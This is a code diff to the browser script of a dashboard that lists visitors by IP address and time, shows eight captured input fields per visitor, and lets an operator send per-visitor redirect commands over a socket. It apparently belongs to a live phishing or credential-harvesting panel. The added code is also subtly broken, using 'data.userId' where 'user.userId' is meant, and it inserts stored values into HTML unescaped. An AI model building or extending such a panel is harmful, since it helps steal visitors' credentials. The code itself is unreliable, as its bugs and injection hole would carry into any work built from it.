@@ -55,6 +55,35 @@
             $(document).ready(function() {
 
                 const socket = io();
+
+                $.get('/users', data => {
+                    data.forEach(user => {
+                        $('table tbody').prepend(`
+                            <tr userId="${user.userId}">
+                                <td><span>${user.ipAddress}</span> <button class="table-copy">📋</button></td>
+                                <td><span>${user.userId}</span> <button class="table-copy">📋</button></td>
+                                <td><span>${user.datetime}</span> <button class="table-copy">📋</button></td>
+                                <td><span>${user.span}</span> <button class="table-copy">📋</button></td>
+                                <td><span>${user.input1}</span> <button class="table-copy">📋</button></td>
+                                <td><span>${user.input2}</span> <button class="table-copy">📋</button></td>
+                                <td><span>${user.input3}</span> <button class="table-copy">📋</button></td>
+                                <td><span>${user.input4}</span> <button class="table-copy">📋</button></td>
+                                <td><span>${user.input5}</span> <button class="table-copy">📋</button></td>
+                                <td><span>${user.input6}</span> <button class="table-copy">📋</button></td>
+                                <td><span>${user.input7}</span> <button class="table-copy">📋</button></td>
+                                <td><span>${user.input8}</span> <button class="table-copy">📋</button></td>
+                                <td>
+                                    <span style="display: none">✅</span>
+                                    <input type="text" userId="${data.userId}" class="table-input">
+                                </td>
+                                <td>
+                                    <input type="text" userId="${data.userId}" class="table-main-input">
+                                </td>
+                                <td><button userId="${data.userId}" class="table-btn">Close Popup</button></td>
+                            </tr>
+                        `)
+                    });
+                })
     
                 socket.on('updateTable', (data) => {
                     $('table tbody').prepend(`
@@ -89,7 +118,6 @@
 
                 $('table').on('input', '.table-input', function() {
                     socket.emit('redirect', $(this).attr('userId'), $(this).val())
-                    $(this).parents('tr').find('.table-btn').attr('link', $(this).val())
                     $(this).hide()
                     $(this).parent().find('span').show()
                 })
